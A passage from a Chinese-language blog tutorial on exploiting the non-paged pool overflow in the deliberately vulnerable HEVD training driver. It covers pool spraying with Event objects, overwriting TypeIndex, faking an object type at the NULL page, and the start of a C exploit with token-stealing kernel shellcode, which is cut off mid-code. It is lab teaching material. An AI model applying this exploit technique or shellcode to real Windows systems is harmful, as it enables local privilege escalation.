@@ -1,0 +1,938 @@
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+        <link rel="canonical" href="https://50u1w4y.github.io/HEVD/nonPagedpooloverflow/">
+      
+      
+        <meta name="author" content="50u1w4y">
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.4.0">
+    
+    
+      
+        <title>（三）HEVD 非换页池溢出 - 50u1w4y</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.0284f74d.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.01803549.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="">
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.74668098.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="indigo">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#0x00" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="https://50u1w4y.github.io" title="50u1w4y" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              50u1w4y
+            </span>
+            <span class="md-header-nav__topic">
+              
+                （三）HEVD 非换页池溢出
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href="../.." title="Welcome" class="md-tabs__link">
+        Welcome
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../homePage/" title="HEVD" class="md-tabs__link md-tabs__link--active">
+          HEVD
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../misc/homePage/" title="胡说" class="md-tabs__link">
+          胡说
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="https://50u1w4y.github.io" title="50u1w4y" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    50u1w4y
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="Welcome" class="md-nav__link">
+      Welcome
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      HEVD
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        HEVD
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../homePage/" title="Home Page" class="md-nav__link">
+      Home Page
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../buildEnv/" title="HEVD 环境搭建" class="md-nav__link">
+      HEVD 环境搭建
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../stackoverflow/" title="（一）HEVD 栈溢出" class="md-nav__link">
+      （一）HEVD 栈溢出
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../arbitraryWrite/" title="（二）HEVD 任意地址覆盖" class="md-nav__link">
+      （二）HEVD 任意地址覆盖
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        （三）HEVD 非换页池溢出
+      </label>
+    
+    <a href="./" title="（三）HEVD 非换页池溢出" class="md-nav__link md-nav__link--active">
+      （三）HEVD 非换页池溢出
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#0x00" title="0x00 前言" class="md-nav__link">
+    0x00 前言
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x01" title="0x01 非换页池溢出漏洞分析" class="md-nav__link">
+    0x01 非换页池溢出漏洞分析
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#kernel-buffer-event-pool-spray" title="保证 kernel buffer 后紧跟 Event 对象 (pool spray)" class="md-nav__link">
+    保证 kernel buffer 后紧跟 Event 对象 (pool spray)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#typeindex" title="覆盖 TypeIndex" class="md-nav__link">
+    覆盖 TypeIndex
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#object-type" title="伪造 object type" class="md-nav__link">
+    伪造 object type
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellcode" title="执行 shellcode" class="md-nav__link">
+    执行 shellcode
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x02" title="0x02 非换页池溢出漏洞利用" class="md-nav__link">
+    0x02 非换页池溢出漏洞利用
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x03" title="0x03 结束语" class="md-nav__link">
+    0x03 结束语
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      胡说
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        胡说
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../misc/homePage/" title="Home Page" class="md-nav__link">
+      Home Page
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../misc/gitalkBuild/" title="mkdocs-material 搭建 gitalk" class="md-nav__link">
+      mkdocs-material 搭建 gitalk
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#0x00" title="0x00 前言" class="md-nav__link">
+    0x00 前言
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x01" title="0x01 非换页池溢出漏洞分析" class="md-nav__link">
+    0x01 非换页池溢出漏洞分析
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#kernel-buffer-event-pool-spray" title="保证 kernel buffer 后紧跟 Event 对象 (pool spray)" class="md-nav__link">
+    保证 kernel buffer 后紧跟 Event 对象 (pool spray)
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#typeindex" title="覆盖 TypeIndex" class="md-nav__link">
+    覆盖 TypeIndex
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#object-type" title="伪造 object type" class="md-nav__link">
+    伪造 object type
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellcode" title="执行 shellcode" class="md-nav__link">
+    执行 shellcode
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x02" title="0x02 非换页池溢出漏洞利用" class="md-nav__link">
+    0x02 非换页池溢出漏洞利用
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#0x03" title="0x03 结束语" class="md-nav__link">
+    0x03 结束语
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  <h1>（三）HEVD 非换页池溢出</h1>
+                
+                <p><small>转载请注明出处哦 :  )</small></p>
+<h2 id="0x00">0x00 前言<a class="headerlink" href="#0x00" title="Permanent link">&para;</a></h2>
+<p>本篇的内容为非换页池溢出漏洞分析利用</p>
+<h2 id="0x01">0x01 非换页池溢出漏洞分析<a class="headerlink" href="#0x01" title="Permanent link">&para;</a></h2>
+<p>首先打开 BufferOverflowNonPagedPool.c 文件</p>
+<p><img alt="alt 1" src="../images/nonPagedpooloverflow/1.jpg" /></p>
+<p>我们可以很明显地发现池溢出漏洞。函数接受我们的用户 buffer 并直接将用户 buffer 复制到刚分配的非换页池中。</p>
+<p>emmmm 那现在我们发现了一个 bug 但是这个漏洞有办法利用吗？它又不像在栈中我们可以直接覆盖 eip 来控制指令流，在非换页池中造成溢出除了蓝屏外(是的，: )若我们修改了不该改的东西，比如说池头，马上就蓝屏了，有兴趣的朋友可以试试，反正玩 windows 经常给整崩，还好有虚拟机)我们有办法控制指令流吗？</p>
+<p>答案是肯定的。不过首先我们先补充点知识。</p>
+<p>当我们通过 CreateXXX(比如说 CreateEvent, CreateFile 等等)创建一个对象时，系统会自动帮我们在非换页池中申请一块区域来保存这个对象</p>
+<p>比如我们通过这么一段小代码来创建 Event 对象试试:</p>
+<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">ctypes</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">struct</span>
+<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">kernel32</span> <span class="o">=</span> <span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span>
+    <span class="n">ntdll</span> <span class="o">=</span> <span class="n">windll</span><span class="o">.</span><span class="n">ntdll</span>
+
+    <span class="n">hevDevice</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">CreateFileA</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">.</span><span class="se">\\</span><span class="s2">HackSysExtremeVulnerableDriver&quot;</span><span class="p">,</span> <span class="mh">0xC0000000</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">hevDevice</span> <span class="ow">or</span> <span class="n">hevDevice</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s2">&quot;*** Couldn&#39;t get Device Driver handle.&quot;</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="n">buf</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">504</span>
+    <span class="n">buf_ad</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">+</span> <span class="mi">20</span>
+
+    <span class="n">spray_event1</span> <span class="o">=</span> <span class="p">[]</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
+        <span class="n">spray_event1</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateEventA</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">False</span><span class="p">,</span> <span class="bp">None</span><span class="p">))</span>
+
+    <span class="n">kernel32</span><span class="o">.</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hevDevice</span><span class="p">,</span> <span class="mh">0x22200f</span><span class="p">,</span> <span class="n">buf_ad</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="bp">None</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">byref</span><span class="p">(</span><span class="n">c_ulong</span><span class="p">()),</span> <span class="bp">None</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</pre></div>
+
+<p>（这里为什么要分配 20 个 Event 对象，是因为非换页池极有可能非常的零碎，等会儿我们展示 TriggerBufferOverflowNonPagedPool 函数分配的非换页池附近的空间中都可能根本看不到 Event，多分配一点好找仅此而已）下好断点后我们运行一下上面的程序，在 windbg 中我们可以看到</p>
+<p><img alt="alt 2" src="../images/nonPagedpooloverflow/2.jpg" /></p>
+<p><code>命令是 !pool 0x85EABDC8</code></p>
+<p>我们在图中可以看到标签为 Hack 的是我们的漏洞函数分配的空间，标签为 Even(t) 且 size 为 40 的是我们的代码分配的空间。当然池中可能还有其它标签为 Even 但是 size 不为 40 的对象，那不是我们分配的，至于为什么 size 不一样是因为创建的场景和传入的参数都会影响到这个值。那为什么我们可以知道 size 为 40 的就是我们创建的呢？等会儿 spray 的时候你看到那一大堆的 Even 就可以很显然地知道那是我们创建的了，那一堆 Even 的 size 都是 40。</p>
+<p>现在我们来看看这个对象在池中的结构</p>
+<p><img alt="alt 3" src="../images/nonPagedpooloverflow/3.jpg" /></p>
+<p><img alt="alt 4" src="../images/nonPagedpooloverflow/4.jpg" /></p>
+<blockquote>
+<p>红色部分为 pool header</p>
+<p>黄色部分为 object header quota info</p>
+<p>蓝色部分为 object header</p>
+<p>绿色部分为 object body</p>
+</blockquote>
+<p>这就是 Even 对象的 40 个 size 的全部构成。我觉得其它的都应该很好理解，header + body 嘛。但是那个 quota info 是什么鬼？</p>
+<p>在对象中，对象头的上方可能存在可选的头部信息（也称为子头部），可选的头部信息一共有这么几种：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>process info</th>
+<th>quota info</th>
+<th>handle info</th>
+<th>name info</th>
+<th>creator info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>掩码</td>
+<td>0x10</td>
+<td>0x08</td>
+<td>0x04</td>
+<td>0x02</td>
+<td>0x01</td>
+</tr>
+<tr>
+<td>大小</td>
+<td>0x08</td>
+<td>0x10</td>
+<td>0x08</td>
+<td>0x10</td>
+<td>0x10</td>
+</tr>
+</tbody>
+</table>
+<p>在对象创建的时候，根据对象的种类、创建的场景以及传入的参数不同，可选头部有可能存在，也有可能不存在。存在的话有可能只存在一个，也有可能同时存在多个。具体存在与否可以看到 object header 中的 InfoMask，其指示了该对象存在何种可选头部信息。</p>
+<p>比如说上图中我们可以看到 InfoMask 段的值为 0x8，因此可选头部信息为 quota info，正好是 0x10 个字节。</p>
+<p>说是这样说，但我们一开始 dd 85eabfc0 的时候，怎么知道它到底有没有可选头部信息以及有多少个呢？（因为假设说你不知道有没有可选头部信息以及有多少个，你就根本不知道 InfoMask 的偏移到底是多少）如果是正着写程序的话我们当然知道我们是否有创建可选头部信息以及都创建了什么，但我们现在是直接逆着来通过看池结构进行分析。</p>
+<p>这个只能说看经验了，一共就两种大小组一组看看 InfoMask 对不对得上，若是对得上的话你就知道都创建了什么可选头部信息了。</p>
+<p>好到现在我们已经知道了 Event 对象在非换页池中的结构了。接下来看看我们感兴趣的东西: TypeIndex 段。</p>
+<p>每个对象都有其对应的种类，这点在对象头中用 TypeIndex 段进行标识。TypeIndex 的值代表着该对象的 object type 在 ObTypeIndexTable 中的偏移。</p>
+<p><img alt="alt 5" src="../images/nonPagedpooloverflow/5.jpg" /></p>
+<p>比如上图的 TypeIndex 段的值为 0xc，那么其 object type 的地址在表中的位置就是红框中的位置。</p>
+<p>现在我们看看 Event 对象的 object type</p>
+<p><img alt="alt 6" src="../images/nonPagedpooloverflow/6.jpg" /></p>
+<p>我们感兴趣的数据段为 TypeInfo，下图是 TypeInfo 的结构</p>
+<p><img alt="alt 7" src="../images/nonPagedpooloverflow/7.jpg" /></p>
+<p>看到红框中的部分，这一部分是回调函数，其含义为当该种类的对象 XXX 时所要调用的函数的地址。</p>
+<p>好，到现在应该已经补充完了我们所需要的知识了。</p>
+<p>回到一开始的问题，我们有办法通过非换页池溢出漏洞来控制指令流吗？上面也说了答案是肯定的，我们只需要</p>
+<blockquote>
+<ol>
+<li>保证我们的 kernel buffer 后紧跟一个 Event 对象。<blockquote>
+<ul>
+<li>为什么要是 Event 对象呢？因为我们的 kernel buffer 在池中的大小为 0x200(0x1f8 + 0x8)，而 Event 对象在池中的大小为 0x40。0x40 * 8 = 0x200。这有什么用呢？下文的 pool spray 一文中会给出解释。</li>
+<li>如何保证我们的 kernel buffer 后紧跟一个 Event 对象呢？这可以通过 pool spray 来得到保证</li>
+</ul>
+</blockquote>
+</li>
+<li>通过池溢出漏洞覆盖 kernel buffer 后紧跟的 Event 对象的 object header 中的 TypeIndex 的值为 0x00<blockquote>
+<ul>
+<li>为什么要覆盖为 0x00 呢？因为显然我们没办法在用户模式下修改 Event 对象的 object type 字段的值。不过看到 ObTypeIndexTable[0] 的值为 0x00000000，这是一个 NULL 指针，指向空指针区。（x86 下 0x00000000~0x0000FFFF 是一段空指针区，理论上是不可读写的，对它进行读写就会报错，用来预防程序员对 NULL 指针进行操作）我们在用户模式下可以通过 NtAllocateVirtualMemory 来分配这段地址的内存空间，用 WriteProcessMemory 来覆盖这段地址的内存空间。因此我们就可以在 0x00000000 处伪造一个 object type，来使 kernel buffer 后紧跟的 Event 对象的 TypeIndex 指向这个 object type</li>
+</ul>
+</blockquote>
+</li>
+<li>在 0x00000000 处伪造一个 object type，使它的 CloseProcedure 指向我们的 shellcode</li>
+<li>调用 CloseHandle 来执行我们的 shellcode</li>
+</ol>
+</blockquote>
+<h3 id="kernel-buffer-event-pool-spray">保证 kernel buffer 后紧跟 Event 对象 (pool spray)<a class="headerlink" href="#kernel-buffer-event-pool-spray" title="Permanent link">&para;</a></h3>
+<p>pool spray 翻译应该是池喷射。它分为三步。</p>
+<blockquote>
+<p>第一步通过分配大量较小的非换页池空间来填补非换页池中存在的碎片。即使之后还存在碎片也不是我们的 kernel buffer 能放得下的</p>
+<p>通过第一步的铺垫我们可以认为接下来分配的空间是连续的，因此第二步为分配一段连续的空间记为 x。</p>
+<p>第三步在 x 中挖出很多正好符合我们要求大小的洞，以确保我们的 kernel buff 能正好被分配到这其中的一个洞上并且其后紧跟的是属于 x 的空间。</p>
+</blockquote>
+<p>不知道这样说大家能不能理解，毕竟自己是个幼儿园水平的画手，这里就不贴图了，就算不能理解等会儿看看代码再来回顾一下应该能懂吧。</p>
+<p>所以为什么我们要用 Event 对象呢? 因为我们的 kernel buffer 在池中的大小为 0x200(0x1f8 + 0x8)，而 Event 对象在池中的大小为 0x40。0x40 * 8 = 0x200。因此，我们只要回收 8 个 Event 对象就能在 x 中挖出一个 0x200 大小的洞。而且 0x40 也满足第一步的要求。</p>
+<h3 id="typeindex">覆盖 TypeIndex<a class="headerlink" href="#typeindex" title="Permanent link">&para;</a></h3>
+<p>就像栈溢出一样，我们只要通过溢出就能改写紧跟在 kernel buffer 后的内存空间了，因此覆盖 TypeIndex 不是什么问题。但是这里要注意的是不能破坏原本的 Event 对象的结构，特别是池头，不然直接蓝屏。因此我们只修改那么一个字节就好了。</p>
+<h3 id="object-type">伪造 object type<a class="headerlink" href="#object-type" title="Permanent link">&para;</a></h3>
+<p>我们可以通过 NtAllocateVirtualMemory 来分配基址为 0x00000000 的内存空间，使其变成可读写的存在，然后通过 WriteProcessMemory 来为 CloseProcedure 赋值。</p>
+<h3 id="shellcode">执行 shellcode<a class="headerlink" href="#shellcode" title="Permanent link">&para;</a></h3>
+<p>通过 CloseHandle 来回收被我们修改过的 Event 对象就能触发 CloseProcedure 来执行我们的 shellcode 的。但问题是我们不知道哪一块才是我们修改过的 Event 对象。没关系，我们直接把剩下的空间全部回收了就行，而且这才是正确的编程习惯，不然就会变成一直占着池空间不用了。</p>
+<h2 id="0x02">0x02 非换页池溢出漏洞利用<a class="headerlink" href="#0x02" title="Permanent link">&para;</a></h2>
+<p>通过上面的分析我们已经知道如何利用漏洞来执行 shellcode 了，接下来贴出源码看看细节</p>
+<div class="codehilite"><pre><span></span><span class="c1">// nonPagedpooloverflow.cpp : Defines the entry point for the console application.</span>
+<span class="c1">//</span>
+
+<span class="cp">#include</span> <span class="cpf">&quot;stdafx.h&quot;</span><span class="cp"></span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;Memoryapi.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;intrin.h&gt;</span><span class="cp"></span>
+
+
+<span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">NtAllocateVirtualMemory_t</span><span class="p">)</span> <span class="p">(</span><span class="n">HANDLE</span>    <span class="n">ProcessHandle</span><span class="p">,</span>
+    <span class="n">PVOID</span>     <span class="o">*</span><span class="n">BaseAddress</span><span class="p">,</span>
+    <span class="n">ULONG_PTR</span> <span class="n">ZeroBits</span><span class="p">,</span>
+    <span class="n">PSIZE_T</span>   <span class="n">RegionSize</span><span class="p">,</span>
+    <span class="n">ULONG</span>     <span class="n">AllocationType</span><span class="p">,</span>
+    <span class="n">ULONG</span>     <span class="n">Protect</span><span class="p">);</span>
+
+<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+
+    <span class="s">&quot;</span><span class="se">\x90\x90\x90\x90</span><span class="s">&quot;</span>              <span class="c1">// NOP Sled</span>
+    <span class="s">&quot;</span><span class="se">\x60</span><span class="s">&quot;</span>                          <span class="c1">// pushad</span>
+    <span class="s">&quot;</span><span class="se">\x31\xc0</span><span class="s">&quot;</span>                      <span class="c1">// xor eax,eax</span>
+    <span class="s">&quot;</span><span class="se">\x64\x8b\x80\x24\x01\x00\x00</span><span class="s">&quot;</span>  <span class="c1">// mov eax,[fs:eax+0x124]</span>
+    <span class="s">&quot;</span><span class="se">\x8b\x40\x50</span><span class="s">&quot;</span>                  <span class="c1">// mov eax,[eax+0x50]</span>
+    <span class="s">&quot;</span><span class="se">\x89\xc1</span><span class="s">&quot;</span>                      <span class="c1">// mov ecx,eax</span>
+    <span class="s">&quot;</span><span class="se">\xba\x04\x00\x00\x00</span><span class="s">&quot;</span>          <span class="c1">// mov edx,0x4</span>
+    <span class="s">&quot;</span><span class="se">\x8b\x80\xb8\x00\x00\x00</span><span class="s">&quot;</span>      <span class="c1">// mov eax,[eax+0xb8]</span>
+    <span class="s">&quot;</span><span class="se">\x2d\xb8\x00\x00\x00</span><span class="s">&quot;</span>          <span class="c1">// sub eax,0xb8</span>
+    <span class="s">&quot;</span><span class="se">\x39\x90\xb4\x00\x00\x00</span><span class="s">&quot;</span>      <span class="c1">// cmp [eax+0xb4],edx</span>
+    <span class="s">&quot;</span><span class="se">\x75\xed</span><span class="s">&quot;</span>                      <span class="c1">// jnz 0x1a</span>
+    <span class="s">&quot;</span><span class="se">\x8b\x90\xf8\x00\x00\x00</span><span class="s">&quot;</span>      <span class="c1">// mov edx,[eax+0xf8]</span>
+    <span class="s">&quot;</span><span class="se">\x89\x91\xf8\x00\x00\x00</span><span class="s">&quot;</span>      <span class="c1">// mov [ecx+0xf8],edx</span>
+    <span class="s">&quot;</span><span class="se">\x61</span><span class="s">&quot;</span>                          <span class="c1">// popad</span>
+
+    <span class="s">&quot;</span><span class="se">\xC3</span><span class="s">&quot;</span>                          <span class="c1">// ret</span>
+    <span class="c1">//&quot;\xC2\x10\x00&quot;                  // ret 16</span>
+<span class="p">};</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">504</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+
+    <span class="kt">char</span> <span class="o">*</span><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">+</span> <span class="mi">40</span><span class="p">);</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">temp</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="mi">504</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="mh">0x04080040</span><span class="p">;</span>
+    <span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="n">ULONG</span><span class="p">)</span><span class="n">temp</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">);</span>
